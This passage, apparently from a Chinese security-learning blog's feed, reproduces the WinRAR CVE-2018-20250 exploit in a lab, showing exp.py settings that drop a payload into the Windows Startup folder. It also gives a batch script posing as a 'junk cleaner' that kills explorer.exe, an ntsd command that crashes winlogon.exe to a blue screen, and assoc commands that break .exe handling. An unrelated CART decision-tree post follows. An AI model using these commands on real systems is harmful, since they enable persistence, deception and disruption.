title="UNACEV2.dll"><p>下载CVE-2018-20250漏洞利用工具。解压出来如下：</p><ul><li><code>README.md</code>是漏洞利用说明书，告诉我们哪些参数可以修改、如何运行exp以及漏洞被利用的后果</li><li><code>hello.txt</code>和<code>world.txt</code>是需要压缩的文件</li><li><code>calc.exe</code>是计算器，可以替换成恶意软件，它会被定向植入系统自启动目录</li><li><code>exp.py</code>是运行的Python代码，它会将<code>hello.txt</code>和<code>world.txt</code>压缩，并隐藏恶意软件</li><li><code>acefile.py</code>是利用<code>UNACEV2.dll</code>漏洞的代码，共4000多行</li></ul><img src="/posts/82a69c8b/2.2.1.png" class="" title="漏洞利用工具"><h4 id="2-2-3-3-复现过程"><a href="#2-2-3-3-复现过程" class="headerlink" title="2.2.3.3 复现过程"></a>2.2.3.3 复现过程</h4><p>如果想要修改恶意文件、压缩文件名称、放在启动目录的文件名称等等，可以通过编辑<code>exp.py</code>实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment"># The archive filename you want</span></span><br><span class="line">rar_filename = <span class="string">&quot;test.rar&quot;</span></span><br><span class="line"><span class="comment"># The evil file you want to run</span></span><br><span class="line">evil_filename = <span class="string">&quot;calc.exe&quot;</span></span><br><span class="line"><span class="comment"># The decompression path you want, such shown below</span></span><br><span class="line">target_filename = <span class="string">r&quot;C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe&quot;</span></span><br><span class="line"><span class="comment"># Other files to be displayed when the victim opens the winrar</span></span><br><span class="line"><span class="comment"># filename_list=[]</span></span><br><span class="line">filename_list = [<span class="string">&quot;hello.txt&quot;</span>, <span class="string">&quot;world.txt&quot;</span>]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>运行<code>exp.py</code>，将生成的<code>test.rar</code>发送到靶机中。</p><img src="/posts/82a69c8b/2.2.2.png" class="" title="test.rar"><p>笑死，被发现了。为了实验，将它从隔离区拿出来。</p><img src="/posts/82a69c8b/2.2.3.png" class="" title="安全威胁提示"><p>查看压缩包发现里面不仅有<code>hello.txt</code>和<code>world.txt</code>，还有一个本地磁盘路径，点进去发现就是在自启动目录下放置的<code>hi.exe</code>。(这真的太明显了吧！！)</p><img src="/posts/82a69c8b/2.2.4.png" class="" title="查看压缩包"><p>注意：当用户解压文件时，其解压目录必须是<code>C:\Users\当前用户</code>目录下。</p><p>当用户解压完后，会在自启动目录生成一个<code>hi.exe</code>，也就是<code>calc.exe</code>。在系统重启后会自动打开<code>calc.exe</code>。</p><img src="/posts/82a69c8b/2.2.5.png" class="" title="自启动目录"><h2 id="2-3-恶意自启动防御"><a href="#2-3-恶意自启动防御" class="headerlink" title="2.3 恶意自启动防御"></a>2.3 恶意自启动防御</h2><p>自启动防御可以看<a href="https://v5le0n9.github.io/posts/a48809a5.html#3-2-检查启动项">熊猫烧香病毒的行为机理分析 3.2 检查启动项</a>，在WinRAR恶意劫持自启动漏洞中，可通过删除自启动目录下的恶意软件实现防御。</p><h1 id="3-进程关闭脚本"><a href="#3-进程关闭脚本" class="headerlink" title="3. 进程关闭脚本"></a>3. 进程关闭脚本</h1><p>继续编写一个伪装成“系统垃圾清理”的程序，它其实是一个进程关闭程序，试着关闭桌面进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line">echo =====若有杀毒软件恶意拦截，请选择【允许程序的所有操作】====</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo =====垃圾清理中，请不要关闭窗口=========</span><br><span class="line">echo.</span><br><span class="line">ping -n 5 127.0.0.1&gt;nul</span><br><span class="line">taskkill /im explorer.exe /f &gt;nul</span><br><span class="line">echo.</span><br><span class="line">echo =====拐了，你的系统已经废了=======</span><br><span class="line">echo.</span><br><span class="line">ping -n 5 127.0.0.1&gt;nul</span><br><span class="line">echo.</span><br><span class="line">start c:\windows\explorer.exe</span><br><span class="line">echo.</span><br><span class="line">echo =====已经修复好！是不是吓坏了！！O(∩_∩)O==========</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>运行该批处理程序，桌面会消失，过一会儿桌面又会恢复。</p><h1 id="4-蓝屏攻击机理"><a href="#4-蓝屏攻击机理" class="headerlink" title="4. 蓝屏攻击机理"></a>4. 蓝屏攻击机理</h1><p>蓝屏死机称为BSOD(Blue Screen of Death)，也是常见的攻击行为，尤其是某些CVE漏洞复现过程，在进行提权尝试前都会先实现蓝屏攻击功能，危害极大。</p><h2 id="4-1-批处理脚本实现蓝屏攻击"><a href="#4-1-批处理脚本实现蓝屏攻击" class="headerlink" title="4.1 批处理脚本实现蓝屏攻击"></a>4.1 批处理脚本实现蓝屏攻击</h2><p>实现蓝屏的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.exe</span><br></pre></td></tr></table></figure><p>ntsd是一个用户态进程调试工具，从Windows 2000就开始被附随在System32目录下。它能够结束除<code>System</code>、<code>smss.exe</code>、<code>csrss.exe</code>、<code>lsass.exe</code>及各种<code>rootkit</code>程序外所有的程序。但在Windows Vista(06年发布)及以上版本的Windows中不含ntsd，必须手动下载至电脑中才可使用。</p><p>为了方便，直接使用Windows 2003实验。制作成批处理脚本或直接在CMD窗口输入命令，主机直接蓝屏并重启。(重启太快了没有蓝屏截图)</p><p>Windows Logon Process(即<code>winlogon.exe</code>)，是Windows NT 用户登录程序，用于管理用户登录和退出。该进程的正常路径应是<code>C:\Windows\System32</code>，且是以 SYSTEM 用户运行。</p><h2 id="4-2-ntsd命令常用参数"><a href="#4-2-ntsd命令常用参数" class="headerlink" title="4.2 ntsd命令常用参数"></a>4.2 ntsd命令常用参数</h2><img src="/posts/82a69c8b/4.2.1.png" class="" title="ntsd常用参数"><p>-c “<command>“表示c参数后面紧接命令，如上面的“q”应该是退出命令。</p><h2 id="4-3-结束进程的几种方法"><a href="#4-3-结束进程的几种方法" class="headerlink" title="4.3 结束进程的几种方法"></a>4.3 结束进程的几种方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//利用进程的PID结束进程</span><br><span class="line">ntsd -c q -p PID</span><br><span class="line"></span><br><span class="line">//利用进程名结束进程</span><br><span class="line">ntsd -c q -pn xxxx.exe</span><br><span class="line"></span><br><span class="line">//利用taskkill命令强制终止进程</span><br><span class="line">taskkill /f /im PID</span><br><span class="line">taskkill /f /im xxxx.exe </span><br><span class="line"></span><br><span class="line">//利用tskill命令结束进程</span><br><span class="line">tskill PID</span><br><span class="line">//xxxx不能带有后缀名</span><br><span class="line">tskill xxxx</span><br></pre></td></tr></table></figure><h1 id="5-简单的扩展名修改恶意攻击"><a href="#5-简单的扩展名修改恶意攻击" class="headerlink" title="5. 简单的扩展名修改恶意攻击"></a>5. 简单的扩展名修改恶意攻击</h1><p>将文件格式修改或文档加密都是常见的病毒，比如永恒之蓝、勒索病毒等，它们就是将电脑内的所有资料、文档加密。当用户打开文件时需要密码，此时通过比特币付费进行勒索。</p><p>编写批处理脚本，当遇到可执行的EXE文件认为它是一个TXT文档，系统默认用记事本打开导致可执行文件运行不起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure><p>“以管理员身份运行”，EXE文件被当作TXT文件打开。</p><img src="/posts/82a69c8b/5.1.1.png" class=""><p>其它格式文件转换为TXT文件如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assoc .htm=txtfile</span><br><span class="line">assoc .dat=txtfile</span><br><span class="line">assoc .com=txtfile</span><br><span class="line">assoc .rar=txtfile</span><br><span class="line">assoc .gho=txtfile</span><br><span class="line">assoc .mvb=txtfile</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此时，如果用户隐藏文件扩展名，甚至可以修改图标伪装成目标应用，当用户点击时会执行这些破坏。但由于不知道目标是否有隐藏扩展名，还是不建议这种“笨”方法。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;.bat&lt;/code&gt;文件是DOS下的批处理文件。批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为&lt;code&gt;.bat&lt;/code&gt;或&lt;code&gt;.cmd&lt;/code&gt;。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用&lt;code&gt;cmd.exe&lt;/code&gt;按照该文件中各个命令出现的顺序依次运行它们。使用批处理文件或脚本，可以简化日常或重复性任务。攻击者通常通过批处理文件的编写来实现多工具的组合入侵、自动入侵及结果提取等功能。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>决策树之CART算法</title>
    <link href="http://example.com/posts/8464a317.html"/>
    <id>http://example.com/posts/8464a317.html</id>
    <published>2022-06-05T13:51:36.733Z</published>
    <updated>2022-06-05T14:55:01.147Z</updated>
    
    <content type="html"><![CDATA[<p>CART算法是二叉决策树。本来这个算法难得我想放弃，copy某位博主的代码修改修改就交上去的。结果越改越多，最后除了核心算法没改，整个框架结构都被我改了。被我修改得看起来貌似有点累赘，但好像也是必要的。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateData</span>():</span><br><span class="line">    x = np.array([[<span class="string">&#x27;有房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;125&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;100&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;70&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;有房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;120&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;离异&#x27;</span>,<span class="string">&#x27;95&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;60&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;有房&#x27;</span>,<span class="string">&#x27;离异&#x27;</span>,<span class="string">&#x27;220&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;85&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;75&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;90&#x27;</span>]])</span><br><span class="line">    signal = np.array([<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]) <span class="comment">#用0表示特征是离散的，1表示是连续的</span></span><br><span class="line">    y = np.array([<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;是&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;是&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;是&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> x, y, signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DataProcessing</span>(<span class="params">x, signal</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(signal)):</span><br><span class="line">        <span class="keyword">if</span> signal[i] == <span class="number">1</span>:</span><br><span class="line">            tmp = x[:,i]       </span><br><span class="line">            int_list = [<span class="built_in">int</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> tmp]</span><br><span class="line">            sort_lst = <span class="built_in">sorted</span>(int_list)</span><br><span class="line">            split_point = [j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(sort_lst[<span class="number">0</span>],sort_lst[-<span class="number">1</span>],<span class="built_in">int</span>((sort_lst[-<span class="number">1</span>]-sort_lst[<span class="number">0</span>])/<span class="built_in">len</span>(sort_lst)))]</span><br><span class="line">            smin = <span class="number">20000</span> <span class="comment">#初始化方差</span></span><br><span class="line">            jmin = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> split_point:</span><br><span class="line">                x1, x2 = [], []</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(int_list)):</span><br><span class="line">                    <span class="keyword">if</span> k &gt;= int_list[j]:</span><br><span class="line">                        x1.append(int_list[j])</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        x2.append(int_list[j])</span><br><span class="line">                <span class="comment">#print(x1,x2)</span></span><br><span class="line">                r1, r2 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">                avg1 = <span class="built_in">sum</span>(x1) / <span class="built_in">len</span>(x1)</span><br><span class="line">                avg2 = <span class="built_in">sum</span>(x2) / <span class="built_in">len</span>(x2)</span><br><span class="line">                <span class="comment">#print(avg1, avg2)</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> x1:</span><br><span class="line">                    r1 += (j - avg1) ** <span class="number">2</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> x2:</span><br><span class="line">                    r2 += (j - avg2) ** <span class="number">2</span></span><br><span class="line">                <span class="comment">#print(r1+r2)</span></span><br><span class="line">                <span class="keyword">if</span> r1 + r2 &lt; smin:</span><br><span class="line">                    jmin = k</span><br><span class="line">                    smin = r1 + r2</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(int_list)):</span><br><span class="line">                <span class="keyword">if</span> int_list[j] &gt; jmin:</span><br><span class="line">                    x[j][i] = <span class="string">&#x27;高&#x27;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    x[j][i] = <span class="string">&#x27;低&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#基尼指数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Gini</span>(<span class="params">y</span>):</span><br><span class="line">    <span class="comment">#Counter()用来统计不同类别的数量</span></span><br><span class="line">    counter = Counter(y)</span><br><span class="line">    g = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> counter.values():</span><br><span class="line">        p = num / <span class="built_in">len</span>(y)</span><br><span class="line">        g -= p * p</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="comment">#CART算法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DecisionTree</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.tree = &#123;&#125;</span><br><span class="line">        self.lst = []<span class="comment"># 若有2个以上特征值的特征需记下哪个特征值作为切分点时得出的基尼指数最小</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#训练决策树</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">self,x,y</span>):</span><br><span class="line">        cols = <span class="built_in">list</span>(<span class="built_in">range</span>(x.shape[<span class="number">1</span>]))<span class="comment"># [0,1,2]</span></span><br><span class="line">        <span class="comment">#对x的每一列数据，计算基尼指数</span></span><br><span class="line">        self.tree = self._genTree(cols, x, y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#递归生成决策树</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_genTree</span>(<span class="params">self, cols, x, y</span>):</span><br><span class="line">        <span class="comment"># 计算基尼指数，求得基尼指数最小的特征</span></span><br><span class="line">        imin = cols[<span class="number">0</span>] <span class="comment"># 初始化最小基尼指数的特征</span></span><br><span class="line">        emin = <span class="number">1</span> <span class="comment"># 初始化最小基尼指数为1</span></span><br><span class="line">        e = <span class="number">0.01</span> <span class="comment"># 阈值</span></span><br><span class="line">        st = <span class="string">&#x27;&#x27;</span> <span class="comment"># 若有2个以上特征值的特征需记下哪个特征值作为切分点时得出的基尼指数最小</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cols:</span><br><span class="line">            coli = x[:,i]<span class="comment">#拿到第i个特征数据</span></span><br><span class="line">            <span class="comment">#在特征为i的情况下，样本集的基尼指数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt; <span class="built_in">len</span>(<span class="built_in">set</span>(coli)) &lt;= <span class="number">2</span>:</span><br><span class="line">                gini = <span class="built_in">sum</span>([<span class="built_in">len</span>(y[coli==d]) / <span class="built_in">len</span>(coli) * Gini(y[coli==d]) <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">set</span>(coli)])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                emin_tmp = <span class="number">1</span></span><br><span class="line">                setlst = <span class="built_in">list</span>(<span class="built_in">set</span>(coli))</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(setlst)):</span><br><span class="line">                    gini = <span class="built_in">len</span>(y[coli==setlst[d]]) / <span class="built_in">len</span>(coli) * Gini(y[coli==setlst[d]])</span><br><span class="line">                    gini += <span class="built_in">len</span>(y[coli!=setlst[d]]) / <span class="built_in">len</span>(coli) * Gini(y[coli!=setlst[d]])      </span><br><span class="line">                    <span class="keyword">if</span> gini &lt;= emin_tmp:</span><br><span class="line">                        st = setlst[d]</span><br><span class="line">                        emin_tmp = gini      </span><br><span class="line">                gini = emin_tmp</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> gini &lt;= emin:</span><br><span class="line">                imin = i</span><br><span class="line">                emin = gini</span><br><span class="line">        self.lst.append(st)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#根据最优特征和最优切分点，生成两个子节点   </span></span><br><span class="line">        newtree=&#123;&#125;</span><br><span class="line">        mincol = x[:,imin]</span><br><span class="line">        cols.remove(imin)</span><br><span class="line">        <span class="comment">#针对这个特征的每个特征值，进一步划分树</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt; <span class="built_in">len</span>(<span class="built_in">set</span>(mincol)) &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">set</span>(mincol):</span><br><span class="line">                gini = Gini(y[mincol==d])  <span class="comment"># 计算基尼指数</span></span><br><span class="line">                <span class="keyword">if</span> gini &lt; e <span class="keyword">or</span> <span class="built_in">len</span>(cols) == <span class="number">0</span>:<span class="comment">#已经完全分开或已无特征</span></span><br><span class="line">                    y_label = Counter(y[mincol==d])</span><br><span class="line">                    y_num = <span class="built_in">max</span>(y_label.values())</span><br><span class="line">                    <span class="keyword">for</span> key,values <span class="keyword">in</span> y_label.items():</span><br><span class="line">                        <span class="keyword">if</span> values == y_num:</span><br><span class="line">                            newtree[d] = key</span><br><span class="line">                <span class="keyword">else</span>:<span class="comment">#还需要进一步细分</span></span><br><span class="line">                    newtree[d] = self._genTree(cols.copy(), x[mincol==d, :], y[mincol==d])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gini = Gini(y[mincol==st])</span><br><span class="line">            <span class="keyword">if</span> gini &lt; e <span class="keyword">or</span> <span class="built_in">len</span>(cols) == <span class="number">0</span>:<span class="comment">#已经完全分开或已无特征</span></span><br><span class="line">                y_label = Counter(y[mincol==st])</span><br><span class="line">                y_num = <span class="built_in">max</span>(y_label.values())</span><br><span class="line">                <span class="keyword">for</span> key,values <span class="keyword">in</span> y_label.items():</span><br><span class="line">                    <span class="keyword">if</span> values == y_num:</span><br><span class="line">                        newtree[st] = key</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#还需要进一步细分</span></span><br><span class="line">                newtree[st] = self._genTree(cols.copy(), x[mincol==st, :], y[mincol==st])</span><br><span class="line"></span><br><span class="line">            gini = Gini(y[mincol!=st])</span><br><span class="line">            <span class="keyword">if</span> gini &lt; e <span class="keyword">or</span> <span class="built_in">len</span>(cols) == <span class="number">0</span>:<span class="comment">#已经完全分开或已无特征</span></span><br><span class="line">                y_label = Counter(y[mincol!=st])</span><br><span class="line">                y_num = <span class="built_in">max</span>(y_label.values())</span><br><span class="line">                <span class="keyword">for</span> key,values <span class="keyword">in</span> y_label.items():</span><br><span class="line">                    <span class="keyword">if</span> values == y_num:</span><br><span class="line">                        newtree[<span class="string">&#x27;非&#x27;</span>+st] = key</span><br><span class="line">            <span class="keyword">else</span>:<span class="comment">#还需要进一步细分</span></span><br><span class="line">                newtree[<span class="string">&#x27;非&#x27;</span>+st] = self._genTree(cols.copy(), x[mincol!=st, :], y[mincol!=st])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> &#123;imin: newtree&#125;<span class="comment">#将列号作为索引，返回新生成的树</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#预测新样本</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">predict</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = x.tolist()</span><br><span class="line">        y = [<span class="literal">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            predictDict = self.tree</span><br><span class="line">            <span class="keyword">while</span> predictDict != <span class="string">&#x27;是&#x27;</span> <span class="keyword">and</span> predictDict != <span class="string">&#x27;否&#x27;</span>:</span><br><span class="line">                col = <span class="built_in">list</span>(predictDict.keys())[<span class="number">0</span>]</span><br><span class="line">                predictDict = predictDict[col]</span><br><span class="line">                <span class="keyword">if</span> x[i][col] <span class="keyword">not</span> <span class="keyword">in</span> predictDict.keys():</span><br><span class="line">                    predictDict = predictDict[<span class="string">&#x27;非&#x27;</span>+self.lst[j]]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    predictDict = predictDict[x[i][col]]</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                y[i] = predictDict</span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    x, y, signal = CreateData()</span><br><span class="line">    x = DataProcessing(x, signal)</span><br><span class="line">    dt = DecisionTree()</span><br><span class="line">    dt.fit(x, y)</span><br><span class="line">    <span class="built_in">print</span>(dt.tree)</span><br><span class="line">    <span class="built_in">print</span>(dt.predict(x))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;CART算法是二叉决策树。本来这个算法难得我想放弃，copy某位博主的代码修改修改就交上去的。结果越改越多，最后除了核心算法没改，整个框架结构都被我改了。被我修改得看起来貌似有点累赘，但好像也是必要的。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>熊猫烧香病毒的行为机理分析</title>
    <link href="http://example.com/posts/a48809a5.html"/>
    <id>http://example.com/posts/a48809a5.html</id>
    <published>2022-05-28T06:59:44.232Z</published>
    <updated>2022-06-30T06:04:36.015Z</updated>
    
